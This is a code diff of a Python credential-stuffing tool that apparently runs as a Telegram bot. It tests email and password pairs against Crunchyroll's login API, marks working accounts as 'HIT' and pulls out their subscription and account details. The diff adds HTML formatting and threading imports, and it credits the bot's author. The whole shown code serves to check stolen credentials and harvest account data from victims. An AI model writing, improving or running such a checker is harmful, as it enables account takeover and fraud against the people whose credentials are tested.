@@ -1,6 +1,8 @@
 import requests
 import json
 import time
+import threading
+from telebot import types
 
 def check_crunchy(email, password):
     login_url = "https://beta-api.crunchyroll.com/auth/v1/token"
@@ -75,18 +77,18 @@ def check_crunchy(email, password):
 
             response_message = (
                 f"HIT SUCCESSFULLY✅\n"
-                f"Email Verified: {email_verified}\n"
-                f"Account Creation Date: {account_creation_date}\n"
-                f"Subscription Name: {subscription_name}\n"
-                f"Currency: {currency}\n"
-                f"Subscription Amount: {subscription_amount}\n"
+                f"<b>Email Verified:</b> {email_verified}\n"
+                f"<b>Account Creation Date:</b> {account_creation_date}\n"
+                f"<b>Subscription Name:</b> {subscription_name}\n"
+                f"<b>Currency:</b> {currency}\n"
+                f"<b>Subscription Amount:</b> {subscription_amount}\n"
             )
             return "Hit", response_message
         else:
             response_message = (
                 f"HIT SUCCESSFULLY✅\n"
-                f"Email Verified: {email_verified}\n"
-                f"Account Creation Date: {account_creation_date}\n"
+                f"<b>Email Verified:</b> {email_verified}\n"
+                f"<b>Account Creation Date:</b> {account_creation_date}\n"
                 f"Subscription Info: {json.dumps(subscription_info_data)}\n"
             )
             return "Hit", response_message
@@ -94,14 +96,17 @@ def check_crunchy(email, password):
         error_message = response_data.get('error_description', 'Invalid Credentials🚫')
         return "Dead", error_message
 
-def get_footer_info(total_accounts, start_time, username):
-    elapsed_time = time.time() - start_time
+def get_footer_info(total_accounts, username):
     footer = (
-        f"－－－－－－－－－－－－－－－－\n"
-        f"⌧ Total ACCOUNT Checked - {total_accounts}\n"
-        f"⌧ Time Taken - {elapsed_time:.2f} seconds\n"
-        f"⌧ Checked by: {username}\n"
-        f"⚡️ Bot by - AFTAB [BOSS]\n"
-        f"－－－－－－－－－－－－－－－－"
+        f"<b>－－－－－－－－－－－－－－－－</b>\n"
+        f"<b>Total ACCOUNT Checked</b> - {len(total_accounts)}\n"
+        f"<b>Checked by:</b> @{username}\n"
+        f"<b>Bot by:</b> <a href='https://t.me/aftab_kabirr'> Aftab👑</a>\n"
+        f"<b>－－－－－－－－－－－－－－－－</b>"
     )
     return footer
+
+# Main bot processing code
+
+
+
